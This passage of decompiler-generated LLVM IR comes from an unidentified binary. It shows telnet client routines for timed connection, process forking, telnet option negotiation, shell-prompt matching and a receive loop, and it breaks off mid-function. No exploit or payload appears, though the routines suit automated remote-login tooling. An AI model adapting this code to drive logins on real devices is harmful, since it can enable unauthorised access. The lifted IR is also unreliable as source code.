dec_label_pc_10002720.loopexit:                   ; preds = %dec_label_pc_100026fc, %dec_label_pc_100026bc
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_100026bc ], [ 0, %dec_label_pc_100026fc ]
  br label %dec_label_pc_10002720

dec_label_pc_10002720:                            ; preds = %dec_label_pc_10002720.loopexit, %dec_label_pc_10002708.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10002708.preheader ], [ %storemerge.ph, %dec_label_pc_10002720.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_10002688, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100026bc, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268445560, i32* @lr, align 4
  %v2_10002774 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_100027a0.44 to i32), i32* @lr, align 4
  %v2_1000279c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_100027ac = urem i32 %arg3, 65536
  store i32 %v1_100027ac, i32* @r3, align 4
  %v1_100027b4 = call i32 @htons(i32 %v1_100027ac)
  %v2_100027c4 = ptrtoint i32* %stack_var_-200 to i32
  %v4_100027d4 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_100027c4)
  %v3_100027dc = icmp eq i32 %v4_100027d4, 0
  br i1 %v3_100027dc, label %dec_label_pc_100027f0, label %dec_label_pc_100027e4

dec_label_pc_100027e4:                            ; preds = %entry
  br label %dec_label_pc_100029b0

dec_label_pc_100027f0:                            ; preds = %entry
  store i32 268445724, i32* @lr, align 4
  %v3_10002818 = call i32 @__libc_connect(i32 %arg1, i32 %v2_100027c4, i32 16)
  %tmp26 = icmp sgt i32 %v3_10002818, -1
  br i1 %tmp26, label %dec_label_pc_1000296c, label %dec_label_pc_10002830

dec_label_pc_10002830:                            ; preds = %dec_label_pc_100027f0
  %v0_10002830 = call i32 @__errno_location()
  %v1_10002838 = inttoptr i32 %v0_10002830 to i32*
  %v2_10002838 = load i32, i32* %v1_10002838, align 4
  %v3_1000283c = icmp eq i32 %v2_10002838, 115
  br i1 %v3_1000283c, label %dec_label_pc_10002844, label %dec_label_pc_10002960

dec_label_pc_10002844:                            ; preds = %dec_label_pc_10002830
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_10002854 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_10002854, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge

dec_label_pc_10002868.dec_label_pc_10002868_crit_edge: ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge, %dec_label_pc_10002844
  %v3_1000286c.pre = phi i32 [ %v2_10002854, %dec_label_pc_10002844 ], [ %v3_1000286c.pre.pre, %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge ]
  %v1_1000288430 = phi i32 [ 1, %dec_label_pc_10002844 ], [ %v1_10002884, %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge ]
  %v1_10002870 = mul nuw nsw i32 %v1_1000288430, 4
  %v2_10002874 = add i32 %v1_10002870, %v3_1000286c.pre
  %v2_1000287c = inttoptr i32 %v2_10002874 to i32*
  store i32 0, i32* %v2_1000287c, align 4
  %v1_10002884 = add nuw nsw i32 %v1_1000288430, 1
  %tmp27 = icmp ult i32 %v1_10002884, 32
  br i1 %tmp27, label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge, label %dec_label_pc_10002898

dec_label_pc_10002868.dec_label_pc_10002868_crit_edge.dec_label_pc_10002868.dec_label_pc_10002868_crit_edge_crit_edge: ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge
  %v3_1000286c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge

dec_label_pc_10002898:                            ; preds = %dec_label_pc_10002868.dec_label_pc_10002868_crit_edge
  %v1_1000289c = udiv i32 %arg1, 32
  %v1_100028a4 = mul nuw nsw i32 %v1_1000289c, 4
  %v2_100028a8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_100028ac = add nuw nsw i32 %v1_100028a4, 32
  %v1_100028b0 = add i32 %v2_100028ac, %v2_100028a8
  %v1_100028b4 = inttoptr i32 %v1_100028b0 to i32*
  %v2_100028b4 = load i32, i32* %v1_100028b4, align 4
  %v1_100028bc = urem i32 %arg1, 32
  %v3_100028c4 = shl i32 1, %v1_100028bc
  %v2_100028c8 = or i32 %v2_100028b4, %v3_100028c4
  store i32 %v2_100028c8, i32* %v1_100028b4, align 4
  %v1_100028e4 = add i32 %arg1, 1
  %v2_100028ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 268445960, i32* @lr, align 4
  %v5_10002904 = call i32 @__libc_select(i32 %v1_100028e4, i32 0, i32 %v2_10002854, i32 0, i32 %v2_100028ec)
  %tmp28 = icmp slt i32 %v5_10002904, 1
  br i1 %tmp28, label %dec_label_pc_10002954, label %dec_label_pc_10002914

dec_label_pc_10002914:                            ; preds = %dec_label_pc_10002898
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000291c = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002920 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268446012, i32* @lr, align 4
  %v5_10002938 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_1000291c, i32 %v2_10002920)
  %v3_1000293c = load i32, i32* %stack_var_-44, align 4
  %v3_10002940 = icmp eq i32 %v3_1000293c, 0
  br i1 %v3_10002940, label %dec_label_pc_1000296c, label %dec_label_pc_10002948

dec_label_pc_10002948:                            ; preds = %dec_label_pc_10002914
  br label %dec_label_pc_100029b0

dec_label_pc_10002954:                            ; preds = %dec_label_pc_10002898
  br label %dec_label_pc_100029b0

dec_label_pc_10002960:                            ; preds = %dec_label_pc_10002830
  br label %dec_label_pc_100029b0

dec_label_pc_1000296c:                            ; preds = %dec_label_pc_10002914, %dec_label_pc_100027f0
  store i32 268446080, i32* @lr, align 4
  %v2_1000297c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_1000298c = call i32 @__asm_rlwinm(i32 %v2_1000297c, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_100029a8.45 to i32), i32* @lr, align 4
  %v2_100029a4 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_100029b0

dec_label_pc_100029b0:                            ; preds = %dec_label_pc_10002960, %dec_label_pc_10002954, %dec_label_pc_10002948, %dec_label_pc_100027e4, %dec_label_pc_1000296c
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_1000296c ], [ 0, %dec_label_pc_10002954 ], [ 0, %dec_label_pc_10002948 ], [ 0, %dec_label_pc_10002960 ], [ 0, %dec_label_pc_100027e4 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_10002884, { 1, 0 }
  uselistorder i32 %v2_10002854, { 1, 0, 2 }
  uselistorder i32 %v2_100027c4, { 1, 0 }
  uselistorder i32 %v1_100027ac, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_100029b0, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268446184, i32* @lr, align 4
  %v0_100029e4 = call i32 @__libc_fork()
  %v3_100029f4 = icmp eq i32 %v0_100029e4, 0
  br i1 %v3_100029f4, label %dec_label_pc_10002b78, label %dec_label_pc_10002a08

dec_label_pc_10002a08:                            ; preds = %entry
  %v3_10002a10 = load i32, i32* @global_var_100285bc.47, align 4
  %v2_10002a14 = load i32, i32* @global_var_100285b8.46, align 4
  %v1_10002a18 = add i32 %v3_10002a10, 1
  %v2_10002a18 = icmp eq i32 %v3_10002a10, -1
  %v2_10002a1c = zext i1 %v2_10002a18 to i32
  %v3_10002a1c = add i32 %v2_10002a1c, %v2_10002a14
  store i32 %v3_10002a1c, i32* @global_var_100285b8.46, align 4
  store i32 %v1_10002a18, i32* @global_var_100285bc.47, align 4
  %v1_10002a4c = mul i32 %v1_10002a18, 4
  %v1_10002a54 = add i32 %v1_10002a4c, 4
  store i32 %v1_10002a54, i32* @r3, align 4
  store i32 268446304, i32* @lr, align 4
  %v0_10002a5c = call i32 @malloc()
  br label %dec_label_pc_10002ab4

dec_label_pc_10002a74:                            ; preds = %dec_label_pc_10002ab4, %dec_label_pc_10002b04
  %v1_10002a78 = mul i32 %storemerge2, 4
  %v2_10002a84 = add i32 %v1_10002a78, %v0_10002a5c
  %v3_10002a98 = load i32, i32* @global_var_100285e4.48, align 4
  %v2_10002a9c = add i32 %v3_10002a98, %v1_10002a78
  %v1_10002aa0 = inttoptr i32 %v2_10002a9c to i32*
  %v2_10002aa0 = load i32, i32* %v1_10002aa0, align 4
  %v2_10002aa4 = inttoptr i32 %v2_10002a84 to i32*
  store i32 %v2_10002aa0, i32* %v2_10002aa4, align 4
  %v1_10002aac = add i32 %storemerge2, 1
  br label %dec_label_pc_10002ab4

dec_label_pc_10002ab4:                            ; preds = %dec_label_pc_10002a08, %dec_label_pc_10002a74
  %storemerge2 = phi i32 [ 0, %dec_label_pc_10002a08 ], [ %v1_10002aac, %dec_label_pc_10002a74 ]
  %v3_10002adc = load i32, i32* @global_var_100285bc.47, align 4
  %v2_10002ae0 = load i32, i32* @global_var_100285b8.46, align 4
  %v2_10002ae4 = icmp ne i32 %v3_10002adc, 0
  %v3_10002ae8 = add i32 %v2_10002ae0, -1
  %v4_10002ae8 = sext i1 %v2_10002ae4 to i32
  %v3_10002afc = icmp eq i32 %v3_10002ae8, %v4_10002ae8
  br i1 %v3_10002afc, label %dec_label_pc_10002b04, label %dec_label_pc_10002a74

dec_label_pc_10002b04:                            ; preds = %dec_label_pc_10002ab4
  %v1_10002ae4 = add i32 %v3_10002adc, -1
  %v3_10002b1c = icmp ugt i32 %v1_10002ae4, %storemerge2
  br i1 %v3_10002b1c, label %dec_label_pc_10002a74, label %dec_label_pc_10002b24

dec_label_pc_10002b24:                            ; preds = %dec_label_pc_10002b04
  %v1_10002b38 = mul i32 %v3_10002adc, 4
  %v2_10002b44 = add i32 %v0_10002a5c, -4
  %v1_10002b48 = add i32 %v2_10002b44, %v1_10002b38
  %v2_10002b50 = inttoptr i32 %v1_10002b48 to i32*
  store i32 %v0_100029e4, i32* %v2_10002b50, align 4
  %v3_10002b58 = load i32, i32* @global_var_100285e4.48, align 4
  store i32 %v3_10002b58, i32* @r3, align 4
  store i32 268446564, i32* @lr, align 4
  %v0_10002b60 = call i32 @free()
  store i32 %v0_10002a5c, i32* @global_var_100285e4.48, align 4
  br label %dec_label_pc_10002b78

dec_label_pc_10002b78:                            ; preds = %entry, %dec_label_pc_10002b24
  ret i32 %v0_100029e4

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002a78, { 1, 0 }
  uselistorder i32 %v0_10002a5c, { 1, 2, 0 }
  uselistorder i32 %v3_10002a10, { 1, 0 }
  uselistorder label %dec_label_pc_10002b78, { 1, 0 }
  uselistorder label %dec_label_pc_10002ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10002a74, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_10002bbc = add i32 %arg2, 1
  %v1_10002bc0 = inttoptr i32 %v1_10002bbc to i8*
  %v2_10002bc0 = load i8, i8* %v1_10002bc0, align 1
  %v1_10002bd0 = icmp ult i8 %v2_10002bc0, -5
  br i1 %v1_10002bd0, label %dec_label_pc_10002d28, label %dec_label_pc_10002bd8

dec_label_pc_10002bd8:                            ; preds = %entry
  %v2_10002bdc = icmp eq i8 %v2_10002bc0, -1
  br i1 %v2_10002bdc, label %dec_label_pc_10002be4, label %dec_label_pc_10002c00

dec_label_pc_10002be4:                            ; preds = %dec_label_pc_10002bd8
  br label %dec_label_pc_10002d28

dec_label_pc_10002c00:                            ; preds = %dec_label_pc_10002bd8
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_10002c0c = ptrtoint i8* %stack_var_-56 to i32
  store i32 268446752, i32* @lr, align 4
  %v4_10002c1c = call i32 @__libc_send(i32 %arg1, i32 %v2_10002c0c, i32 1, i32 16384)
  %v2_10002c28 = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c30 = icmp eq i8 %v2_10002c28, -4
  br i1 %v3_10002c30, label %dec_label_pc_10002c38, label %dec_label_pc_10002c44

dec_label_pc_10002c38:                            ; preds = %dec_label_pc_10002c00
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002c44:                            ; preds = %dec_label_pc_10002c00
  %v2_10002c4c = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c54 = icmp eq i8 %v2_10002c4c, -2
  br i1 %v3_10002c54, label %dec_label_pc_10002c5c, label %dec_label_pc_10002c68

dec_label_pc_10002c5c:                            ; preds = %dec_label_pc_10002c44
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002c68:                            ; preds = %dec_label_pc_10002c44
  %v2_10002c70 = load i8, i8* %v1_10002bc0, align 1
  %v3_10002c78 = icmp eq i8 %v2_10002c70, 3
  br i1 %v3_10002c78, label %dec_label_pc_10002c80, label %dec_label_pc_10002cb8

dec_label_pc_10002c80:                            ; preds = %dec_label_pc_10002c68
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002cb8:                            ; preds = %dec_label_pc_10002c68
  %v3_10002c90 = icmp eq i8 %v2_10002c70, -3
  %.7 = select i1 %v3_10002c90, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10002cec

dec_label_pc_10002cec:                            ; preds = %dec_label_pc_10002c80, %dec_label_pc_10002c5c, %dec_label_pc_10002c38, %dec_label_pc_10002cb8
  store i32 268446980, i32* @lr, align 4
  %v4_10002d00 = call i32 @__libc_send(i32 %arg1, i32 %v2_10002c0c, i32 1, i32 16384)
  %v1_10002d08 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002d20.49 to i32), i32* @lr, align 4
  %v4_10002d1c = call i32 @__libc_send(i32 %arg1, i32 %v1_10002d08, i32 1, i32 16384)
  br label %dec_label_pc_10002d28

dec_label_pc_10002d28:                            ; preds = %dec_label_pc_10002be4, %dec_label_pc_10002cec, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002d28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002cec, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10002d74 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_100150dc.50 to i32), i32* @r3, align 4
  %v0_10002eb010 = call i32 @__GI_strlen()
  %v2_10002eb812 = icmp eq i32 %v0_10002eb010, 0
  br i1 %v2_10002eb812, label %dec_label_pc_10002ec8, label %dec_label_pc_10002da0.preheader.lr.ph

dec_label_pc_10002da0.preheader.lr.ph:            ; preds = %entry
  %v2_10002dbc = add i32 %v0_10002d74, %arg1
  br label %dec_label_pc_10002da0.preheader

dec_label_pc_10002d94:                            ; preds = %dec_label_pc_10002e28, %dec_label_pc_10002e00, %dec_label_pc_10002dd8, %dec_label_pc_10002db0
  %v1_10002d98 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002da8 = icmp sgt i32 %v0_10002d74, %v1_10002d98
  br i1 %v3_10002da8, label %dec_label_pc_10002db0, label %dec_label_pc_10002e50

dec_label_pc_10002db0:                            ; preds = %dec_label_pc_10002da0.preheader, %dec_label_pc_10002d94
  %stack_var_-40.08 = phi i32 [ %v1_10002d98, %dec_label_pc_10002d94 ], [ %stack_var_-40.115, %dec_label_pc_10002da0.preheader ]
  %v2_10002dc4 = sub i32 %v2_10002dbc, %stack_var_-40.08
  %v1_10002dc8 = inttoptr i32 %v2_10002dc4 to i8*
  %v2_10002dc8 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002dd0 = icmp eq i8 %v2_10002dc8, 0
  br i1 %v3_10002dd0, label %dec_label_pc_10002d94, label %dec_label_pc_10002dd8

dec_label_pc_10002dd8:                            ; preds = %dec_label_pc_10002db0
  %v2_10002df0 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002df8 = icmp eq i8 %v2_10002df0, 32
  br i1 %v3_10002df8, label %dec_label_pc_10002d94, label %dec_label_pc_10002e00

dec_label_pc_10002e00:                            ; preds = %dec_label_pc_10002dd8
  %v2_10002e18 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002e20 = icmp eq i8 %v2_10002e18, 13
  br i1 %v3_10002e20, label %dec_label_pc_10002d94, label %dec_label_pc_10002e28

dec_label_pc_10002e28:                            ; preds = %dec_label_pc_10002e00
  %v2_10002e40 = load i8, i8* %v1_10002dc8, align 1
  %v3_10002e48 = icmp eq i8 %v2_10002e40, 10
  br i1 %v3_10002e48, label %dec_label_pc_10002d94, label %dec_label_pc_10002e50

dec_label_pc_10002e50:                            ; preds = %dec_label_pc_10002e28, %dec_label_pc_10002d94, %dec_label_pc_10002da0.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002da0.preheader ], [ %stack_var_-40.08, %dec_label_pc_10002e28 ], [ %v1_10002d98, %dec_label_pc_10002d94 ]
  %v2_10002e64 = sub i32 %v2_10002dbc, %stack_var_-40.0.lcssa
  %v1_10002e68 = inttoptr i32 %v2_10002e64 to i8*
  %v2_10002e68 = load i8, i8* %v1_10002e68, align 1
  %v2_10002e7c = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_100150dc.50 to i32)
  %v1_10002e80 = inttoptr i32 %v2_10002e7c to i8*
  %v2_10002e80 = load i8, i8* %v1_10002e80, align 1
  %v4_10002e88 = icmp eq i8 %v2_10002e68, %v2_10002e80
  br i1 %v4_10002e88, label %dec_label_pc_10002ec8, label %dec_label_pc_10002e9c

dec_label_pc_10002e9c:                            ; preds = %dec_label_pc_10002e50
  %v1_10002ea0 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_100150dc.50 to i32), i32* @r3, align 4
  %v0_10002eb0 = call i32 @__GI_strlen()
  %v2_10002eb8 = icmp ult i32 %v1_10002ea0, %v0_10002eb0
  br i1 %v2_10002eb8, label %dec_label_pc_10002da0.preheader, label %dec_label_pc_10002ec8

dec_label_pc_10002da0.preheader:                  ; preds = %dec_label_pc_10002da0.preheader.lr.ph, %dec_label_pc_10002e9c
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002da0.preheader.lr.ph ], [ %v1_10002ea0, %dec_label_pc_10002e9c ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002da0.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002e9c ]
  %v3_10002da86 = icmp sgt i32 %v0_10002d74, %stack_var_-40.115
  br i1 %v3_10002da86, label %dec_label_pc_10002db0, label %dec_label_pc_10002e50

dec_label_pc_10002ec8:                            ; preds = %entry, %dec_label_pc_10002e50, %dec_label_pc_10002e9c
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002e50 ], [ 0, %dec_label_pc_10002e9c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002ea0, { 1, 0 }
  uselistorder i32 %v0_10002d74, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_100150dc.50 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002ec8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002da0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002e50, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002f1c = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_1000315c5 = add i32 %v0_10002f1c, 2
  %v2_100031646 = icmp slt i32 %v1_1000315c5, %arg7
  br i1 %v2_100031646, label %dec_label_pc_1000316c.lr.ph, label %dec_label_pc_1000319c

dec_label_pc_1000316c.lr.ph:                      ; preds = %entry
  %v2_10002f54 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002f9c = udiv i32 %arg1, 32
  %v1_10002fa4 = mul nuw nsw i32 %v1_10002f9c, 4
  %v2_10002fa8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002fac = add nuw nsw i32 %v1_10002fa4, 24
  %v1_10002fb0 = add i32 %v2_10002fac, %v2_10002fa8
  %v1_10002fb4 = inttoptr i32 %v1_10002fb0 to i32*
  %v1_10002fbc = urem i32 %arg1, 32
  %v3_10002fc4 = shl i32 1, %v1_10002fbc
  %v1_10002fe4 = add i32 %arg1, 1
  %v2_10002fec = ptrtoint i32* %stack_var_-64 to i32
  %v4_1000311c = inttoptr i32 %arg2 to i8*
  %v3_10003130 = icmp eq i32 %arg3, 0
  %v2_1000317c = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_1000316c

dec_label_pc_10002f54:                            ; preds = %dec_label_pc_10003178, %dec_label_pc_1000316c
  store i32 %v2_10002f54, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge

dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge: ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge, %dec_label_pc_10002f54
  %v3_10002f6c.pre = phi i32 [ %v2_10002f54, %dec_label_pc_10002f54 ], [ %v3_10002f6c.pre.pre, %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge ]
  %v1_10002f8436 = phi i32 [ 1, %dec_label_pc_10002f54 ], [ %v1_10002f84, %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge ]
  %v1_10002f70 = mul nuw nsw i32 %v1_10002f8436, 4
  %v2_10002f74 = add i32 %v1_10002f70, %v3_10002f6c.pre
  %v2_10002f7c = inttoptr i32 %v2_10002f74 to i32*
  store i32 0, i32* %v2_10002f7c, align 4
  %v1_10002f84 = add nuw nsw i32 %v1_10002f8436, 1
  %tmp33 = icmp ult i32 %v1_10002f84, 32
  br i1 %tmp33, label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge, label %dec_label_pc_10002f98

dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge.dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge_crit_edge: ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge
  %v3_10002f6c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge

dec_label_pc_10002f98:                            ; preds = %dec_label_pc_10002f68.dec_label_pc_10002f68_crit_edge
  %v2_10002fb4 = load i32, i32* %v1_10002fb4, align 4
  %v2_10002fc8 = or i32 %v2_10002fb4, %v3_10002fc4
  store i32 %v2_10002fc8, i32* %v1_10002fb4, align 4
  store i32 268447752, i32* @lr, align 4
  %v5_10003004 = call i32 @__libc_select(i32 %v1_10002fe4, i32 %v2_10002f54, i32 0, i32 0, i32 %v2_10002fec)
  %tmp34 = icmp slt i32 %v5_10003004, 1
  br i1 %tmp34, label %dec_label_pc_1000319c, label %dec_label_pc_10003014

dec_label_pc_10003014:                            ; preds = %dec_label_pc_10002f98
  %v2_10003020 = add i32 %stack_var_-196.09, %arg6
  store i32 268447804, i32* @lr, align 4
  %v4_10003038 = call i32 @__libc_recv(i32 %arg1, i32 %v2_10003020, i32 1, i32 0)
  %v4_1000304c = icmp eq i32 %v4_10003038, -1
  br i1 %v4_1000304c, label %dec_label_pc_10003060, label %dec_label_pc_10003054

dec_label_pc_10003054:                            ; preds = %dec_label_pc_10003014
  %v3_10003058 = icmp eq i32 %v4_10003038, 0
  br i1 %v3_10003058, label %dec_label_pc_10003060, label %dec_label_pc_1000306c

dec_label_pc_10003060:                            ; preds = %dec_label_pc_10003054, %dec_label_pc_10003014
  br label %dec_label_pc_100031a4

dec_label_pc_1000306c:                            ; preds = %dec_label_pc_10003054
  %v2_10003074 = add i32 %v4_10003038, %stack_var_-196.09
  %v4_1000307c = inttoptr i32 %v2_10003020 to i8*
  %v3_10003080 = load i8, i8* %v4_1000307c, align 1
  %v3_10003088 = icmp eq i8 %v3_10003080, -1
  br i1 %v3_10003088, label %dec_label_pc_10003090, label %dec_label_pc_10003114

dec_label_pc_10003090:                            ; preds = %dec_label_pc_1000306c
  %v1_10003094 = add i32 %v2_10003020, 1
  store i32 268447916, i32* @lr, align 4
  %v4_100030a8 = call i32 @__libc_recv(i32 %arg1, i32 %v1_10003094, i32 2, i32 0)
  %v4_100030bc = icmp eq i32 %v4_100030a8, -1
  br i1 %v4_100030bc, label %dec_label_pc_100030d0, label %dec_label_pc_100030c4

dec_label_pc_100030c4:                            ; preds = %dec_label_pc_10003090
  %v3_100030c8 = icmp eq i32 %v4_100030a8, 0
  br i1 %v3_100030c8, label %dec_label_pc_100030d0, label %dec_label_pc_100030dc

dec_label_pc_100030d0:                            ; preds = %dec_label_pc_100030c4, %dec_label_pc_10003090
  br label %dec_label_pc_100031a4

dec_label_pc_100030dc:                            ; preds = %dec_label_pc_100030c4
  %v2_100030e4 = add i32 %v4_100030a8, %v2_10003074
  store i32 268447996, i32* @lr, align 4
  %v4_100030f8 = call i32 @negotiate(i32 %arg1, i32 %v2_10003020, i32 3, i32 %v2_10003074)
  %v3_10003100 = icmp eq i32 %v4_100030f8, 0
  br i1 %v3_10003100, label %dec_label_pc_10003108, label %dec_label_pc_10003158.backedge

dec_label_pc_10003108:                            ; preds = %dec_label_pc_100030dc
  br label %dec_label_pc_100031a4

dec_label_pc_10003114:                            ; preds = %dec_label_pc_1000306c
  store i32 268448032, i32* @lr, align 4
  %v5_1000311c = call i32 @strstr(i32 %arg6, i8* %v4_1000311c, i32 %v2_10003020)
  %v3_10003124 = icmp eq i32 %v5_1000311c, 0
  br i1 %v3_10003124, label %dec_label_pc_1000312c, label %dec_label_pc_10003190

dec_label_pc_1000312c:                            ; preds = %dec_label_pc_10003114
  br i1 %v3_10003130, label %dec_label_pc_10003158.backedge, label %dec_label_pc_10003138

dec_label_pc_10003158.backedge:                   ; preds = %dec_label_pc_1000312c, %dec_label_pc_10003138, %dec_label_pc_100030dc
  %stack_var_-196.0.be = phi i32 [ %v2_100030e4, %dec_label_pc_100030dc ], [ %v2_10003074, %dec_label_pc_1000312c ], [ %v2_10003074, %dec_label_pc_10003138 ]
  %v1_1000315c = add i32 %stack_var_-196.0.be, 2
  %v2_10003164 = icmp slt i32 %v1_1000315c, %arg7
  br i1 %v2_10003164, label %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge, label %dec_label_pc_1000319c

dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge: ; preds = %dec_label_pc_10003158.backedge
  %v3_1000316c.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1000316c

dec_label_pc_10003138:                            ; preds = %dec_label_pc_1000312c
  %v1_1000313c = call i32 @matchPrompt(i32 %arg6)
  %v3_10003144 = icmp eq i32 %v1_1000313c, 0
  br i1 %v3_10003144, label %dec_label_pc_10003158.backedge, label %dec_label_pc_10003190

dec_label_pc_1000316c:                            ; preds = %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge, %dec_label_pc_1000316c.lr.ph
  %v3_1000316c = phi i32 [ %arg4, %dec_label_pc_1000316c.lr.ph ], [ %v3_1000316c.pre, %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge ]
